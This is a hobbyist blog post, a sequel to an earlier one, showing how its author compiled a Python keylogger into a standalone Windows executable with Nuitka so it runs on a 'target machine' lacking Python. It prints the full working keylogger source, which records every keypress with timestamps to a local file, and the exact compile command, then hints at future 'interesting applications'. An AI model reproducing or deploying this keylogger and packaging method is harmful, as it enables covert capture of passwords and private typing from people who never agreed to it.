This post is a sequel to [this one](https://blasterman.github.io/blastermans-base/projects/keylogger/) that I wrote prior on making a simple keylogger in Python. Earlier, I wrote that I would like to try out using a keylogger written in Powershell or something similar that utilizes a language a fresh Windows installation would be able to run without any extra binaries or libraries. However, thanks to David Bombal and his video, I‚Äôve discovered that there is a way of merging both writing a keylogging script in Python AND allowing said script to run on a Windows machine that doesn‚Äôt have Python installed.

In the description for his video, David has a link to a pdf he made that outlines the step-by-step process he took to create an executable of a Python keylogger. It can be found at the following link:

The first order of business is to install Nuitka, the program that will convert my Python script to a Windows executable. Since I already have Python on my computer, I can use *pip* to install the correct version of Nuitka for the version of Python I have using *python -m pip install -U nuitka*.

Great! Now that it‚Äôs installed, let‚Äôs make sure it works:

Now it‚Äôs time for the code. Comparing the code that David used against the one I found in the previous post, they‚Äôre pretty much identical save for a few missing/different parameters so it‚Äôll function the same as the one I used last time.

```
{
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
}
```

Once saved, I‚Äôll need to run a command in Python that instructs Nuitka to convert my *.py* file to a *.exe*. The command goes like this:

*py -m nuitka--mingw64 <filename>.py --standalone --onefile*

(Make sure to agree to both prompts in the terminal)

Done!

Now that the script has been compiled, it‚Äôs time to give it a go by *.\myfile.exe*. I‚Äôll give it some time and come back later to see what the script has recorded.

***

Well, I got a little impatient. Let‚Äôs look right now and see what I‚Äôve got:

Heh. It works just like the last one I used! üòÅ

Much thanks to David for making that video and demonstrating that there is a way to run Python scripts on Windows without needing to have the library already preinstalled on the target machine. This was a good amount of fun. Besides, who knows what interesting applications this will have in the future‚Ä¶ üòé
